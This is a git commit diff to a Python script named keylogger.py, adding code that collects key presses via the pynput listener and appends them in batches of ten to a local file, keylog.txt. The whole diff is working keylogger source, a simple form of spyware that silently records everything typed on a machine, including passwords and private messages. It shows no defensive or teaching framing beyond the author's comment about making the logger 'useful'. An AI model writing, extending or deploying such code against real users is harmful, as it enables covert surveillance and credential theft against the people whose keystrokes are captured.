96e0e9b2a95ddf9e3f7e9fe93018103404eabbf2
Charles M. Wolfe <79966004+CMWolfe922@users.noreply.github.com>
2021-11-01 16:05:15 -0500

    Added Write File function

--- keylogger.py
+++ keylogger.py
@@ -3,9 +3,29 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+# Now I need to make this useful in a meaningful way. I need
+# to be able to save the key presses to a text file.
+count = 0
+keys = []
+
 
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open("keylog.txt", "a") as f:
+        for key in keys:
+            f.write(str(key))
 
 
 def on_release(key):
